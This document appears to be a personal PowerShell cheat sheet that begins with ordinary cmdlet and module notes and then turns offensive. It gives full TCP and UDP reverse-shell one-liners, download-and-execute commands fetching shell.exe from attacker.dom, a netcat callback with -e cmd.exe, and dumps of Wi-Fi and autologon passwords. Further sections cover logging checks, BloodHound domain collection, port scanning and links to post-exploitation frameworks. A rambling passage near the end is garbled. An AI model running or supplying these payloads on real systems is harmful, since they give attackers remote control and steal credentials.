Powershell

Cmdlets
	Syntax: Verb-Noun
	common verbs:
		Get Set Start Stop New Show Use Add Close Exit
			-see Powershell Cookbook 3e appendix J
	
Basic *nix utility functions
head || Get-Content in.csv -Head 10p
tail || Get-Content in.csv -Tail 10p
	

Specific Esoteric Functions
Select-String $string $dataRead -Context 1, 3 | % { $_.context.PreContext + $_.line + $_.Context.PostContext } |  out-file "C:\Results.txt"
		--print 3 lines following instance of string
	
Get-ExecutionPolicy
Set-ExecutionPolicy RemoteSigned
Set-Location C:\powershell\scripts
Set-WorkDrv=D:
Get-ChildItem .
Expand-Archive archive.zip

set workDir=powershell\scripts
& "C:\powershell\scripts\script.ps1"
PowerShell -Exec Bypass
	-bypass execution policy limitations

BitsAdmin
Import-Module BitsTransfer
Start-BitsTransfer -Source https://github.com/fireeye/commando-vm/archive/master.zip -Destination c:\users\me\Downloads\commandovm.zip
	--download target file via http/s
Start-BitsTransfer -DisplayName MyJob -Credential User\Domain 

Import Modules
Import-Module C:\Scripts\PowerShellFunctionsLibrary.psm1
Find-Module -Name "MyDSC*" | Install-Module
Install-Module -Name "DscModule"
Set-PSRepository -Name "myInternalSource" -SourceLocation 'http://someNuGetUrl.com/api/v2' -PublishLocation 'http://someNuGetUrl.com/api/v2/packages'
	-Set the source and publish locations for a repository
Set-PSRepository -Name "myInternalSource" -InstallationPolicy Trusted
	-Set the installation policy for a repository
Get-PSRepository
	-list powershell repositories registered
Get-PSRepository -Name "*NuGet*"
	-show info about a repository
Find-Script -Repository "Local1" -Name "Required-Script2
	-find a scripts
Get-Command -Name "Required-Script2"
Install-Script -Repository "Local1" -Name "Required-Script3" -Scope "AllUsers"
Get-InstalledScript -Name "Required-Script3"
	-install a script with AllUsers scope
Find-Script -Repository "Local1" -Name "Script-WithDependencies2" -IncludeDependencies
Get-InstalledScript
	-Install a script with its dependent scripts and modules
Update-Script -Name "Fabrikam-Script" -RequiredVersion 1.5
	-update a script
Update-Module
Update-Module -Name "DscModule"
	-update (all) module(s)
Import-Module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -DomainController sizzle.htb.local -Domain HTB.LOCAL


Package Management:
Get-AppxPackage
	-enumerate all installed Windows Store packages (AppX Deployment Service [AppXSVC])
Get-AppxPackage -Name "Microsoft.*office*" | Remove-AppxPackage
	-remove an installed application installed via Windows Store, e.g. common limited pre-installed version of MS Office

Runtime Environment:
Get-ChildItem env:
	-return environment variables

Shells via powershell:
Current preferred:
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='111.11.1.11';$port=1337;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
WEBDL execute
powershell -ExecutionPolicy Bypass -noLogo -Command Import-Module BitsTransfer;Start-BitsTransfer http://attacker.dom/shell.exe shell.exe;./shell.exe;
powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://attacker.dom/shell.exe','shell.exe');./shell.exe;
powershell -ExecutionPolicy Bypass -noLogo -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.dom/shell')
RTCP shell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.11",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
RUDP shell
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("192.168.1.11"),1337);$client = New-Object System.Net.Sockets.UDPClient(1337);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2>&1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()
WEbInject callback (netcat)
Stage1:	127.0.0.1 | powershell.exe (new-object System.Net.WebClient).Downloadfile('http://192.168.1.11/nc.exe', 'nc.exe')
Stage2:	127.0.0.1 | nc.exe -e cmd.exe 192.168.1.11 21

THIS IS WHY WE CALL IT 'WINDOWS EXPLOIT LANGUAGE'
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' | select defaultusername,defaultpassword
	-dump stored autologon password
DUMP WIFI PASSWORD
$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
	OR
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
	OR
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} |%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
	OR
foreach($profil in (netsh wlan show profiles | Select-String ':')){foreach($line in (netsh wlan show profiles name=($profil.toString().split(':')[1].trim()) key=clear)){$line+';'}};



LOCAL SYSTEM ENUMERATION
((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-19")).translate([System.Security.Principal.NTAccount])).value
	-get user from known SID
gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto
	-get sids for localgroup users and print lastlogon for each
gps | ?{$_.name -match "<process/service name>"} | ?{$_.id -match "<process/service id>"} | select *
	-query infor for process or service by name
[System.IO.DriveInfo]::GetDrives()
	-query drives on localhost
PS C:\> Get-ChildItem "C:\Users\" - recurse -include *passwords*.txt 
	-search recursively for filenames matching a pattern
Get-ChildItem -path env: | get-member
	-return all member attribute names (ONLY NAMES, it's not wrong -stop bothering me, you grown-ass skid-lifers, I'm not your FUCKING technical support on DM, google the error message or stackoverflow like a grown-ass (wo)man- YOU [MAY BE:->read: (ARE)]([DEAD]WRONG)!) set in working runtime environment (the in-memory [via CLR] runtime executing powershell process)
	--any questions? good. Now, you all need to read the non-directly security-relevant notes documents on what you're working on if you want to change anything more than params; powershell notes docs explain how to and to, just to (often PS does this FOR YOU, just look, be aware of your terminal's stdout, else gtfo, --you've got to strike when the moment is right without thinking and after a while you can work on points for style--, check the object type (hint, the answer for this one is TypeName: System.Collections.DictionaryEntry)
Get-Member -inputobject (get-childitem env:)
	-return values for each ChildItem name values, expect return for all members the object input(-->)DictionaryEntry-type Collection returned as child-items of members in path env:

CHECK STATUS OF POWERSHELL LOGGING
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
	
ACTIVE DIRECTORY ENUMERATION
Get-ADGroupMember -Credential $cred -server master.local "Domain Admins"
Get-NetComputer -UnConstrained


WORKGROUP/Local Network Enumeration
PS C:\> 1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_ | SelectString  ttl} 
	-ping sweep class C subnet to which localhost is connected
PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.11.10.11",$_)) "Port $_ open"} 2>$null 
	-portscan target host

	
Privilege Escalation
get-hotfix | Sort-Object HotfixID |format-table
	-enumerate patch levels (alternatively: wmic qfe get)

	
Local Network Enumeration
Get-NetTCPConnection
	-enumerate localhost connections (like netstat)
Get-NetNeighbor
Find-NetRoute 192.168.1.101
Test-NetConnection -Port 80 -ComputerName 192.168.1.111
	-simple port scan
Test-NetConnection 10.10.11.111 -Port 445 -quiet
       -Port scan outputs connection attempt as BOOL value, good for building conditional statements around in scripts

Syntactical convetntions for object and attribute inheritance/inheriting command functions in powershell (via CLR)
	the primary and essential difference between object and attribute inheritance in most sensible programming language design patterns (*caugh* ANSI C99 *caugh/*) is that while both items inherit their privileges and access for the partent function defining them (unless global/extern/&c) is the existence of self-modifiable (assuming permissions inherited or otherwise granted by some context other than the items direct parent as initally invoked/declared
		--powershell executes its runtime in an assembly/machine code context via reference to the CLR (thus must import nevessary & relevant dll libraries), just as C# (on MS Windows) and MS Windows-flavor C++ extenionible libraries, but rather than execute via JIT compilation or the, frankly, rather bloated (esp. in terms of physical RAM/VMEM allocation) MS C++ heavy dll-import dependency compilation for most .NET runtime-contextualized applications.
	
LINKS, COME GET YOUR LINKS! READ ALL ABOUT IT!
POWERSHELL EMPIRE (remote exploitation framework)
https://www.powershellempire.com/
https://github.com/EmpireProject/Empire
https://github.com/interference-security/empire-web
NISHANG (privesc-framework)
https://github.com/samratashok/nishang
POWERSPLOIT (post-exploitation-framework)